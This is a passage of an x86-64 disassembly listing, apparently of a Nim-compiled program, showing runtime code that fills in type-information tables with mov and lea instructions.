  4094a7:	4c 89 35 b2 08 02 00 	mov    %r14,0x208b2(%rip)        # 429d60 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xa0>
  4094ae:	48 89 35 b3 08 02 00 	mov    %rsi,0x208b3(%rip)        # 429d68 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xa8>
  4094b5:	c6 05 c4 08 02 00 01 	movb   $0x1,0x208c4(%rip)        # 429d80 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xc0>
  4094bc:	48 c7 05 c1 08 02 00 	movq   $0x8,0x208c1(%rip)        # 429d88 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xc8>
  4094c3:	08 00 00 00 
  4094c7:	4c 89 2d c2 08 02 00 	mov    %r13,0x208c2(%rip)        # 429d90 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xd0>
  4094ce:	48 89 1d c3 08 02 00 	mov    %rbx,0x208c3(%rip)        # 429d98 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xd8>
  4094d5:	48 c7 05 60 08 02 00 	movq   $0x2,0x20860(%rip)        # 429d40 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x80>
  4094dc:	02 00 00 00 
  4094e0:	c6 05 39 08 02 00 02 	movb   $0x2,0x20839(%rip)        # 429d20 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x60>
  4094e7:	c6 05 02 08 02 00 01 	movb   $0x1,0x20802(%rip)        # 429cf0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x30>
  4094ee:	48 c7 05 ff 07 02 00 	movq   $0x0,0x207ff(%rip)        # 429cf8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x38>
  4094f5:	00 00 00 00 
  4094f9:	c6 05 b0 08 02 00 01 	movb   $0x1,0x208b0(%rip)        # 429db0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xf0>
  409500:	48 c7 05 ad 08 02 00 	movq   $0x10,0x208ad(%rip)        # 429db8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xf8>
  409507:	10 00 00 00 
  40950b:	c6 05 ce 08 02 00 01 	movb   $0x1,0x208ce(%rip)        # 429de0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x120>
  409512:	48 89 05 df 08 02 00 	mov    %rax,0x208df(%rip)        # 429df8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x138>
  409519:	48 8d 05 f0 08 02 00 	lea    0x208f0(%rip),%rax        # 429e10 <TM__6NbDwwj5FY059b1gz2AsAZQ_2_3.52480>
  409520:	48 89 05 c1 07 02 00 	mov    %rax,0x207c1(%rip)        # 429ce8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x28>
  409527:	48 8d 82 10 ff ff ff 	lea    -0xf0(%rdx),%rax
  40952e:	48 89 05 23 09 02 00 	mov    %rax,0x20923(%rip)        # 429e58 <NTI__F8OvqlxXyGXRSiK9c1fCDVw_+0x18>
  409535:	48 8d 15 84 09 02 00 	lea    0x20984(%rip),%rdx        # 429ec0 <TM__f2bNHCHm2LvO7iSrwQtdiQ_0.2165>
  40953c:	48 8d 05 52 9f ff ff 	lea    -0x60ae(%rip),%rax        # 403495 <Marker_tySequence__sM4lkSb7zS6F7OVMvW9cffQ>
  409543:	48 89 15 0e 14 02 00 	mov    %rdx,0x2140e(%rip)        # 42a958 <NTI__mgfFdry9aKsRMW9au5u9bSpOQ_+0x18>
  40954a:	48 89 05 57 09 02 00 	mov    %rax,0x20957(%rip)        # 429ea8 <NTI__sM4lkSb7zS6F7OVMvW9cffQ_+0x28>
  409551:	48 8d 15 58 0a 02 00 	lea    0x20a58(%rip),%rdx        # 429fb0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x30>
  409558:	48 8d 05 c1 14 02 00 	lea    0x214c1(%rip),%rax        # 42aa20 <NTI__5aoVPIWYzahUyBc9bMm0M5w_>
  40955f:	48 89 15 3a 0b 02 00 	mov    %rdx,0x20b3a(%rip)        # 42a0a0 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150>
  409566:	48 89 05 a3 09 02 00 	mov    %rax,0x209a3(%rip)        # 429f10 <NTI__oKfdUHDH0q5oP14wOM6kug_+0x10>
  40956d:	48 8d 15 cc 09 02 00 	lea    0x209cc(%rip),%rdx        # 429f40 <NTI__WF89a8QyKeDCh4DYWTmSiBg_>
  409574:	48 8d 05 ab 9e ff ff 	lea    -0x6155(%rip),%rax        # 403426 <Marker_tySequence__oKfdUHDH0q5oP14wOM6kug>
  40957b:	48 89 15 3e 0a 02 00 	mov    %rdx,0x20a3e(%rip)        # 429fc0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x40>
  409582:	48 89 05 9f 09 02 00 	mov    %rax,0x2099f(%rip)        # 429f28 <NTI__oKfdUHDH0q5oP14wOM6kug_+0x28>
  409589:	48 8d 15 50 0a 02 00 	lea    0x20a50(%rip),%rdx        # 429fe0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x60>
  409590:	48 8d 05 69 09 02 00 	lea    0x20969(%rip),%rax        # 429f00 <NTI__oKfdUHDH0q5oP14wOM6kug_>
  409597:	48 89 15 0a 0b 02 00 	mov    %rdx,0x20b0a(%rip)        # 42a0a8 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150+0x8>
  40959e:	48 83 c2 30          	add    $0x30,%rdx
  4095a2:	48 89 05 27 09 02 00 	mov    %rax,0x20927(%rip)        # 429ed0 <TM__f2bNHCHm2LvO7iSrwQtdiQ_0.2165+0x10>
  4095a9:	48 8d 05 4d 2e 00 00 	lea    0x2e4d(%rip),%rax        # 40c3fd <.rdata+0x3fd>
  4095b0:	48 89 3d 39 08 02 00 	mov    %rdi,0x20839(%rip)        # 429df0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x130>
  4095b7:	48 89 3d d2 08 02 00 	mov    %rdi,0x208d2(%rip)        # 429e90 <NTI__sM4lkSb7zS6F7OVMvW9cffQ_+0x10>
  4095be:	48 89 05 13 09 02 00 	mov    %rax,0x20913(%rip)        # 429ed8 <TM__f2bNHCHm2LvO7iSrwQtdiQ_0.2165+0x18>
  4095c5:	48 89 05 fc 09 02 00 	mov    %rax,0x209fc(%rip)        # 429fc8 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x48>
  4095cc:	48 c7 05 11 08 02 00 	movq   $0x20,0x20811(%rip)        # 429de8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x128>
  4095d3:	20 00 00 00 
  4095d7:	48 c7 05 fe 06 02 00 	movq   $0x3,0x206fe(%rip)        # 429ce0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x20>
  4095de:	03 00 00 00 
  4095e2:	c6 05 d7 06 02 00 02 	movb   $0x2,0x206d7(%rip)        # 429cc0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482>
  4095e9:	48 c7 05 8c 08 02 00 	movq   $0x8,0x2088c(%rip)        # 429e80 <NTI__sM4lkSb7zS6F7OVMvW9cffQ_>
  4095f0:	08 00 00 00 
  4095f4:	66 c7 05 8b 08 02 00 	movw   $0x218,0x2088b(%rip)        # 429e88 <NTI__sM4lkSb7zS6F7OVMvW9cffQ_+0x8>
  4095fb:	18 02 
  4095fd:	48 c7 05 38 13 02 00 	movq   $0x8,0x21338(%rip)        # 42a940 <NTI__mgfFdry9aKsRMW9au5u9bSpOQ_>
  409604:	08 00 00 00 
  409608:	c6 05 39 13 02 00 12 	movb   $0x12,0x21339(%rip)        # 42a948 <NTI__mgfFdry9aKsRMW9au5u9bSpOQ_+0x8>
  40960f:	48 c7 05 36 13 02 00 	movq   $0x0,0x21336(%rip)        # 42a950 <NTI__mgfFdry9aKsRMW9au5u9bSpOQ_+0x10>
  409616:	00 00 00 00 
  40961a:	48 c7 05 db 08 02 00 	movq   $0x8,0x208db(%rip)        # 429f00 <NTI__oKfdUHDH0q5oP14wOM6kug_>
  409621:	08 00 00 00 
  409625:	c6 05 dc 08 02 00 18 	movb   $0x18,0x208dc(%rip)        # 429f08 <NTI__oKfdUHDH0q5oP14wOM6kug_+0x8>
  40962c:	c6 05 8d 08 02 00 01 	movb   $0x1,0x2088d(%rip)        # 429ec0 <TM__f2bNHCHm2LvO7iSrwQtdiQ_0.2165>
  409633:	48 c7 05 8a 08 02 00 	movq   $0x0,0x2088a(%rip)        # 429ec8 <TM__f2bNHCHm2LvO7iSrwQtdiQ_0.2165+0x8>
  40963a:	00 00 00 00 
  40963e:	48 c7 05 b7 12 02 00 	movq   $0x28,0x212b7(%rip)        # 42a900 <NTI__oL07LSXp3QMM0uEpFQiyQg_>
  409645:	28 00 00 00 
  409649:	c6 05 b8 12 02 00 12 	movb   $0x12,0x212b8(%rip)        # 42a908 <NTI__oL07LSXp3QMM0uEpFQiyQg_+0x8>
  409650:	48 c7 05 b5 12 02 00 	movq   $0x0,0x212b5(%rip)        # 42a910 <NTI__oL07LSXp3QMM0uEpFQiyQg_+0x10>
  409657:	00 00 00 00 
  40965b:	c6 05 4e 09 02 00 01 	movb   $0x1,0x2094e(%rip)        # 429fb0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x30>
  409662:	48 c7 05 4b 09 02 00 	movq   $0x0,0x2094b(%rip)        # 429fb8 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x38>
  409669:	00 00 00 00 
  40966d:	c6 05 6c 09 02 00 01 	movb   $0x1,0x2096c(%rip)        # 429fe0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x60>
  409674:	48 89 0d 7d 09 02 00 	mov    %rcx,0x2097d(%rip)        # 429ff8 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x78>
  40967b:	48 8d 0d 85 2d 00 00 	lea    0x2d85(%rip),%rcx        # 40c407 <.rdata+0x407>
  409682:	48 89 15 27 0a 02 00 	mov    %rdx,0x20a27(%rip)        # 42a0b0 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150+0x10>
  409689:	48 83 c2 30          	add    $0x30,%rdx
  40968d:	48 89 0d 94 09 02 00 	mov    %rcx,0x20994(%rip)        # 42a028 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xa8>
  409694:	48 8d 0d 71 2d 00 00 	lea    0x2d71(%rip),%rcx        # 40c40c <.rdata+0x40c>
  40969b:	48 89 15 16 0a 02 00 	mov    %rdx,0x20a16(%rip)        # 42a0b8 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150+0x18>
  4096a2:	48 83 c2 30          	add    $0x30,%rdx
  4096a6:	48 89 0d ab 09 02 00 	mov    %rcx,0x209ab(%rip)        # 42a058 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xd8>
  4096ad:	48 8d 0d 5e 2d 00 00 	lea    0x2d5e(%rip),%rcx        # 40c412 <.rdata+0x412>
  4096b4:	48 89 15 05 0a 02 00 	mov    %rdx,0x20a05(%rip)        # 42a0c0 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150+0x20>
  4096bb:	48 8d 15 de 09 02 00 	lea    0x209de(%rip),%rdx        # 42a0a0 <TM__NdgYN5HU2ty0qMI5oazWyg_2_5.2150>
  4096c2:	48 89 0d bf 09 02 00 	mov    %rcx,0x209bf(%rip)        # 42a088 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x108>
  4096c9:	48 8d 0d b0 08 02 00 	lea    0x208b0(%rip),%rcx        # 429f80 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151>
  4096d0:	48 89 15 d1 08 02 00 	mov    %rdx,0x208d1(%rip)        # 429fa8 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x28>
  4096d7:	48 8d 15 b2 0c 02 00 	lea    0x20cb2(%rip),%rdx        # 42a390 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x30>
  4096de:	48 89 0d 33 12 02 00 	mov    %rcx,0x21233(%rip)        # 42a918 <NTI__oL07LSXp3QMM0uEpFQiyQg_+0x18>
  4096e5:	48 8d 4a 30          	lea    0x30(%rdx),%rcx
  4096e9:	48 89 0d b8 0e 02 00 	mov    %rcx,0x20eb8(%rip)        # 42a5a8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_2_2.52490+0x8>
  4096f0:	48 83 c1 60          	add    $0x60,%rcx
  4096f4:	48 89 15 a5 0e 02 00 	mov    %rdx,0x20ea5(%rip)        # 42a5a0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_2_2.52490>
  4096fb:	48 8d 15 9e 0e 02 00 	lea    0x20e9e(%rip),%rdx        # 42a5a0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_2_2.52490>
  409702:	48 c7 05 db 08 02 00 	movq   $0x8,0x208db(%rip)        # 429fe8 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x68>
  409709:	08 00 00 00 
  40970d:	4c 89 3d dc 08 02 00 	mov    %r15,0x208dc(%rip)        # 429ff0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x70>
  409714:	c6 05 f5 08 02 00 01 	movb   $0x1,0x208f5(%rip)        # 42a010 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x90>
  40971b:	48 c7 05 f2 08 02 00 	movq   $0x10,0x208f2(%rip)        # 42a018 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x98>
  409722:	10 00 00 00 
  409726:	4c 89 3d f3 08 02 00 	mov    %r15,0x208f3(%rip)        # 42a020 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xa0>
  40972d:	c6 05 0c 09 02 00 01 	movb   $0x1,0x2090c(%rip)        # 42a040 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xc0>
  409734:	48 c7 05 09 09 02 00 	movq   $0x18,0x20909(%rip)        # 42a048 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xc8>
  40973b:	18 00 00 00 
  40973f:	4c 89 3d 0a 09 02 00 	mov    %r15,0x2090a(%rip)        # 42a050 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xd0>
  409746:	c6 05 23 09 02 00 01 	movb   $0x1,0x20923(%rip)        # 42a070 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xf0>
  40974d:	48 c7 05 20 09 02 00 	movq   $0x20,0x20920(%rip)        # 42a078 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0xf8>
  409754:	20 00 00 00 
  409758:	4c 89 3d 21 09 02 00 	mov    %r15,0x20921(%rip)        # 42a080 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x100>
  40975f:	48 c7 05 36 08 02 00 	movq   $0x5,0x20836(%rip)        # 429fa0 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151+0x20>
  409766:	05 00 00 00 
  40976a:	c6 05 0f 08 02 00 02 	movb   $0x2,0x2080f(%rip)        # 429f80 <TM__NdgYN5HU2ty0qMI5oazWyg_0.2151>
  409771:	c6 05 18 0c 02 00 01 	movb   $0x1,0x20c18(%rip)        # 42a390 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x30>
  409778:	48 c7 05 15 0c 02 00 	movq   $0x0,0x20c15(%rip)        # 42a398 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x38>
  40977f:	00 00 00 00 
  409783:	4c 89 35 16 0c 02 00 	mov    %r14,0x20c16(%rip)        # 42a3a0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x40>
  40978a:	48 89 35 17 0c 02 00 	mov    %rsi,0x20c17(%rip)        # 42a3a8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x48>
  409791:	c6 05 28 0c 02 00 01 	movb   $0x1,0x20c28(%rip)        # 42a3c0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x60>
  409798:	48 c7 05 25 0c 02 00 	movq   $0x8,0x20c25(%rip)        # 42a3c8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x68>
  40979f:	08 00 00 00 
  4097a3:	4c 89 2d 26 0c 02 00 	mov    %r13,0x20c26(%rip)        # 42a3d0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x70>
  4097aa:	48 89 1d 27 0c 02 00 	mov    %rbx,0x20c27(%rip)        # 42a3d8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x78>
  4097b1:	48 c7 05 c4 0b 02 00 	movq   $0x2,0x20bc4(%rip)        # 42a380 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x20>
  4097b8:	02 00 00 00 
  4097bc:	48 89 0d bd 0a 02 00 	mov    %rcx,0x20abd(%rip)        # 42a280 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_4_4.52491>
  4097c3:	48 83 c1 60          	add    $0x60,%rcx
  4097c7:	48 89 0d 52 0a 02 00 	mov    %rcx,0x20a52(%rip)        # 42a220 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_5_2.52492>
  4097ce:	48 8d 0d 0b 0a 02 00 	lea    0x20a0b(%rip),%rcx        # 42a1e0 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_>
  4097d5:	48 89 0d b4 0c 02 00 	mov    %rcx,0x20cb4(%rip)        # 42a490 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x130>
  4097dc:	48 8d 0d 34 2c 00 00 	lea    0x2c34(%rip),%rcx        # 40c417 <.rdata+0x417>
  4097e3:	48 89 0d ae 0c 02 00 	mov    %rcx,0x20cae(%rip)        # 42a498 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x138>
  4097ea:	48 8d 0d bf 0c 02 00 	lea    0x20cbf(%rip),%rcx        # 42a4b0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x150>
  4097f1:	48 89 0d 30 0a 02 00 	mov    %rcx,0x20a30(%rip)        # 42a228 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_5_2.52492+0x8>
  4097f8:	48 8d 0d e4 9b ff ff 	lea    -0x641c(%rip),%rcx        # 4033e3 <Marker_tyRef__gcUT3qWwCET3KjsqW7m5vQ>
  4097ff:	48 89 0d c2 09 02 00 	mov    %rcx,0x209c2(%rip)        # 42a1c8 <NTI__gcUT3qWwCET3KjsqW7m5vQ_+0x28>
  409806:	48 8d 0d 93 09 02 00 	lea    0x20993(%rip),%rcx        # 42a1a0 <NTI__gcUT3qWwCET3KjsqW7m5vQ_>
  40980d:	48 89 0d ac 0c 02 00 	mov    %rcx,0x20cac(%rip)        # 42a4c0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x160>
  409814:	48 8d 0d 05 2c 00 00 	lea    0x2c05(%rip),%rcx        # 40c420 <.rdata+0x420>
  40981b:	48 89 0d a6 0c 02 00 	mov    %rcx,0x20ca6(%rip)        # 42a4c8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x168>
  409822:	48 8d 0d f7 09 02 00 	lea    0x209f7(%rip),%rcx        # 42a220 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_5_2.52492>
  409829:	48 89 0d 48 0c 02 00 	mov    %rcx,0x20c48(%rip)        # 42a478 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x118>
  409830:	48 8d 0d 19 0c 02 00 	lea    0x20c19(%rip),%rcx        # 42a450 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xf0>
  409837:	48 89 15 4a 0b 02 00 	mov    %rdx,0x20b4a(%rip)        # 42a388 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x28>
  40983e:	48 8d 15 fb 09 02 00 	lea    0x209fb(%rip),%rdx        # 42a240 <NTI__tKSBWiaJMWD3JZxwqg7UFQ_>
  409845:	48 89 0d 0c 0a 02 00 	mov    %rcx,0x20a0c(%rip)        # 42a258 <NTI__tKSBWiaJMWD3JZxwqg7UFQ_+0x18>
  40984c:	48 81 c1 90 00 00 00 	add    $0x90,%rcx
  409853:	48 89 15 56 09 02 00 	mov    %rdx,0x20956(%rip)        # 42a1b0 <NTI__gcUT3qWwCET3KjsqW7m5vQ_+0x10>
  40985a:	48 89 15 cf 0b 02 00 	mov    %rdx,0x20bcf(%rip)        # 42a430 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xd0>
  409861:	48 8d 15 bd 2b 00 00 	lea    0x2bbd(%rip),%rdx        # 40c425 <.rdata+0x425>
  409868:	48 89 0d 19 0a 02 00 	mov    %rcx,0x20a19(%rip)        # 42a288 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_4_4.52491+0x8>
  40986f:	48 8d 0d ea 08 02 00 	lea    0x208ea(%rip),%rcx        # 42a160 <NTI__VaVACK0bpYmqIQ0mKcHfQQ_>
  409876:	48 89 15 bb 0b 02 00 	mov    %rdx,0x20bbb(%rip)        # 42a438 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xd8>
  40987d:	c6 05 dc 0a 02 00 02 	movb   $0x2,0x20adc(%rip)        # 42a360 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493>
  409884:	48 c7 05 11 0a 02 00 	movq   $0x38,0x20a11(%rip)        # 42a2a0 <NTI__NMMT5akQkfNlmjYrVF9a9bwA_>
  40988b:	38 00 00 00 
  40988f:	c6 05 12 0a 02 00 11 	movb   $0x11,0x20a12(%rip)        # 42a2a8 <NTI__NMMT5akQkfNlmjYrVF9a9bwA_+0x8>
  409896:	48 89 2d 13 0a 02 00 	mov    %rbp,0x20a13(%rip)        # 42a2b0 <NTI__NMMT5akQkfNlmjYrVF9a9bwA_+0x10>
  40989d:	48 c7 05 98 09 02 00 	movq   $0x18,0x20998(%rip)        # 42a240 <NTI__tKSBWiaJMWD3JZxwqg7UFQ_>
  4098a4:	18 00 00 00 
  4098a8:	c6 05 99 09 02 00 12 	movb   $0x12,0x20999(%rip)        # 42a248 <NTI__tKSBWiaJMWD3JZxwqg7UFQ_+0x8>
  4098af:	48 c7 05 96 09 02 00 	movq   $0x0,0x20996(%rip)        # 42a250 <NTI__tKSBWiaJMWD3JZxwqg7UFQ_+0x10>
  4098b6:	00 00 00 00 
  4098ba:	c6 05 bf 0b 02 00 01 	movb   $0x1,0x20bbf(%rip)        # 42a480 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x120>
  4098c1:	48 c7 05 bc 0b 02 00 	movq   $0x0,0x20bbc(%rip)        # 42a488 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x128>
  4098c8:	00 00 00 00 
  4098cc:	48 c7 05 c9 08 02 00 	movq   $0x8,0x208c9(%rip)        # 42a1a0 <NTI__gcUT3qWwCET3KjsqW7m5vQ_>
  4098d3:	08 00 00 00 
  4098d7:	c6 05 ca 08 02 00 16 	movb   $0x16,0x208ca(%rip)        # 42a1a8 <NTI__gcUT3qWwCET3KjsqW7m5vQ_+0x8>
  4098de:	c6 05 cb 0b 02 00 01 	movb   $0x1,0x20bcb(%rip)        # 42a4b0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x150>
  4098e5:	48 c7 05 c8 0b 02 00 	movq   $0x10,0x20bc8(%rip)        # 42a4b8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x158>
  4098ec:	10 00 00 00 
  4098f0:	48 c7 05 75 0b 02 00 	movq   $0x2,0x20b75(%rip)        # 42a470 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x110>
  4098f7:	02 00 00 00 
  4098fb:	c6 05 4e 0b 02 00 02 	movb   $0x2,0x20b4e(%rip)        # 42a450 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xf0>
  409902:	c6 05 17 0b 02 00 01 	movb   $0x1,0x20b17(%rip)        # 42a420 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xc0>
  409909:	48 c7 05 14 0b 02 00 	movq   $0x8,0x20b14(%rip)        # 42a428 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xc8>
  409910:	08 00 00 00 
  409914:	c6 05 c5 0b 02 00 01 	movb   $0x1,0x20bc5(%rip)        # 42a4e0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x180>
  40991b:	48 89 0d ce 0b 02 00 	mov    %rcx,0x20bce(%rip)        # 42a4f0 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x190>
  409922:	48 8d 0d 06 2b 00 00 	lea    0x2b06(%rip),%rcx        # 40c42f <.rdata+0x42f>
  409929:	48 89 0d c8 0b 02 00 	mov    %rcx,0x20bc8(%rip)        # 42a4f8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x198>
  409930:	48 8d 0d d9 0b 02 00 	lea    0x20bd9(%rip),%rcx        # 42a510 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1b0>
  409937:	48 89 0d 52 09 02 00 	mov    %rcx,0x20952(%rip)        # 42a290 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_4_4.52491+0x10>
  40993e:	48 8d 0d f3 2a 00 00 	lea    0x2af3(%rip),%rcx        # 40c438 <.rdata+0x438>
  409945:	48 89 3d 04 0c 02 00 	mov    %rdi,0x20c04(%rip)        # 42a550 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1f0>
  40994c:	48 8d 3d eb 2a 00 00 	lea    0x2aeb(%rip),%rdi        # 40c43e <.rdata+0x43e>
  409953:	48 89 0d ce 0b 02 00 	mov    %rcx,0x20bce(%rip)        # 42a528 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1c8>
  40995a:	48 8d 0d df 0b 02 00 	lea    0x20bdf(%rip),%rcx        # 42a540 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1e0>
  409961:	48 89 3d f0 0b 02 00 	mov    %rdi,0x20bf0(%rip)        # 42a558 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1f8>
  409968:	48 8d 3d 11 09 02 00 	lea    0x20911(%rip),%rdi        # 42a280 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_4_4.52491>
  40996f:	48 89 3d a2 0a 02 00 	mov    %rdi,0x20aa2(%rip)        # 42a418 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0xb8>
  409976:	48 8d b9 b0 fe ff ff 	lea    -0x150(%rcx),%rdi
  40997d:	48 89 3d 34 09 02 00 	mov    %rdi,0x20934(%rip)        # 42a2b8 <NTI__NMMT5akQkfNlmjYrVF9a9bwA_+0x18>
  409984:	48 8d 3d 15 09 02 00 	lea    0x20915(%rip),%rdi        # 42a2a0 <NTI__NMMT5akQkfNlmjYrVF9a9bwA_>
  40998b:	48 89 3d 5e 07 02 00 	mov    %rdi,0x2075e(%rip)        # 42a0f0 <NTI__te3W2Tqi7xuJ7rlPtg9al5w_+0x10>
  409992:	48 8d 79 30          	lea    0x30(%rcx),%rdi
  409996:	48 89 3d 5b 07 02 00 	mov    %rdi,0x2075b(%rip)        # 42a0f8 <NTI__te3W2Tqi7xuJ7rlPtg9al5w_+0x18>
  40999d:	48 8d 3d 3c 07 02 00 	lea    0x2073c(%rip),%rdi        # 42a0e0 <NTI__te3W2Tqi7xuJ7rlPtg9al5w_>
  4099a4:	48 89 3d e5 0f 02 00 	mov    %rdi,0x20fe5(%rip)        # 42a990 <NTI__TjokxNjmnZmr9bygVDVC9bvg_+0x10>
  4099ab:	48 8d 3d f3 99 ff ff 	lea    -0x660d(%rip),%rdi        # 4033a5 <Marker_tyRef__TjokxNjmnZmr9bygVDVC9bvg>
  4099b2:	48 89 3d ef 0f 02 00 	mov    %rdi,0x20fef(%rip)        # 42a9a8 <NTI__TjokxNjmnZmr9bygVDVC9bvg_+0x28>
  4099b9:	48 8d 3d 00 0c 02 00 	lea    0x20c00(%rip),%rdi        # 42a5c0 <NTI__Aav8dQoMlCFnZRxA0IhTHQ_>
  4099c0:	48 89 0d d1 08 02 00 	mov    %rcx,0x208d1(%rip)        # 42a298 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_4_4.52491+0x18>
  4099c7:	48 8d 0d b2 7d 00 00 	lea    0x7db2(%rip),%rcx        # 411780 <TM__SXfl4xjKGDTPbJeR9b1nqCQ_4>
  4099ce:	48 c7 05 0f 0b 02 00 	movq   $0x20,0x20b0f(%rip)        # 42a4e8 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x188>
  4099d5:	20 00 00 00 
  4099d9:	c6 05 30 0b 02 00 01 	movb   $0x1,0x20b30(%rip)        # 42a510 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1b0>
  4099e0:	48 c7 05 2d 0b 02 00 	movq   $0x28,0x20b2d(%rip)        # 42a518 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1b8>
  4099e7:	28 00 00 00 
  4099eb:	4c 89 25 2e 0b 02 00 	mov    %r12,0x20b2e(%rip)        # 42a520 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1c0>
  4099f2:	c6 05 47 0b 02 00 01 	movb   $0x1,0x20b47(%rip)        # 42a540 <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_0.52493+0x1e0>
